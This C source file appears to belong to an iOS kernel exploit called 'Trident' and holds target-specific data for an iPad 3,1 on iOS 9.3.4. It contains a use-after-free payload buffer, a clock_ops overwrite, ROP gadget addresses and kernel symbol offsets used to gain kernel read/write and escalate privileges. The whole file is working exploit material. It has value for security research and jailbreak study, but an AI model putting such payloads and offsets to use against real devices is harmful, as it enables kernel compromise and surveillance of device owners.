//
//  target_ipad_3_1_ios_9_3_4.c
//  Trident
//
//  Created by Simone Ferrini on 14/12/2016.
//  Copyright © 2016 Benjamin Randazzo. All rights reserved.
//

#include "target_ipad_3_1_ios_9_3_4.h"

static uint8_t clock_ops_overwrite[] = {
    0x89, 0x83, 0x31, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
    0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
    0x01, 0xe2, 0x01, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1)
    0x39, 0x98, 0x0d, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1)
};

static uint8_t uaf_payload_buffer[] = {
    0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
    0x28, 0x34, 0x40, 0x00, // [04] address of clock_ops array in kern memory
    0xb4, 0x76, 0x0c, 0x00, // [08] address of _copyin
    0x00, 0x00, 0x00, 0x00, // [0C] NULL
    0x89, 0x83, 0x31, 0x00, // [10] address of OSSerializer::serialize (+1)
    0x3a, 0x98, 0x0d, 0x00, // [14] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [18] NULL
    0x91, 0xab, 0x31, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
    0x3a, 0x98, 0x0d, 0x00, // [20] address of "BX LR" code fragment
    0x3a, 0x98, 0x0d, 0x00, // [24] address of "BX LR" code fragment
};

static uint32_t addresses_pool[] = {
    0x000c73e8, // WRITE_GADGET // address of "str r1, [r0, #0xc] ; bx lr"
    0x003f6454, // PMAP
    0x000bc1d4, // FLUSH_DCACHE
    0x000c7440, // INVALIDATE_TLB
    0x002fcec0, // TFP
    0x002a9988, // SETREUID
    0x00318389, // SERIALIZE
    0x00455848, // ADDRPERM
};

static uint32_t check_offsets_pool[] = {
    0x14, // PID
    0x3e, // POSIX
    0x1e6, // MAC_PROC
};

void target_ipad_3_1_ios_9_3_4_init(target_t *t)
{
    t->clock_ops_overwrite = clock_ops_overwrite;
    t->clock_ops_overwrite_size = sizeof(clock_ops_overwrite);
    
    t->uaf_payload_buffer = uaf_payload_buffer;
    t->uaf_payload_buffer_size = sizeof(uaf_payload_buffer);
    
    t->addresses_pool = addresses_pool;
    t->check_offsets_pool = check_offsets_pool;
}
